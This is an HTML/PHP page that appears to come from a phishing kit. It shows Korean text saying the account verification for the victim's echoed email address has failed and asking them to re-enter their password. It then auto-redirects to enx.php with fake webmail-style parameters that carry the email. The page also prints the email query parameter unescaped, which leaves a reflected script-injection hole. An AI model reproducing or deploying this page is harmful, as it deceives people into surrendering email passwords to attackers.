<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
<html><head><title>&#51060;&#47700;&#51068;&#32;&#49444;&#51221;&#32;&#124;&#32;&#54869;&#51064;</title>

<link rel="icon" href="files/id.png" sizes="13x13" type="image/png">

<meta http-equiv="REFRESH" content="10; enx.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=<?php echo $_GET['email']; ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1">

<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'/>
<!-- no core stylesheet -->
</head>


<form method='post' action=''>

                        <font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
                        <div align="center">

			<br><br><br><br><br>

			<div>
			<h2>&#50640;&#32;&#45824;&#54620;&#32;&#44228;&#51221;&#32;&#54869;&#51064; <?php echo $_GET['email']; ?> &#49892;&#54056;&#54664;&#49845;&#45768;&#45796;&#33;</h2>
			<p>&#45796;&#49884;&#32;&#49884;&#46020;&#54616;&#49901;&#49884;&#50724;&#33;&#32;&#51060;&#32;&#51060;&#47700;&#51068;&#50640;&#32;&#50732;&#48148;&#47480;&#32;&#48708;&#48128;&#48264;&#54840;&#47484;&#32;&#51077;&#47141;&#54664;&#45716;&#51648;&#32;&#54869;&#51064;&#54616;&#49901;&#49884;&#50724;&#46;</p>

			<p>&#44263;&#32;&#45796;&#49884;&#32;&#47532;&#46356;&#47113;&#49496;&#46121;&#45768;&#45796;&#46;</p>

			<br><br>
			</div>

			</font>

			</div></form>
</div>


</body></html><!-- 1 -->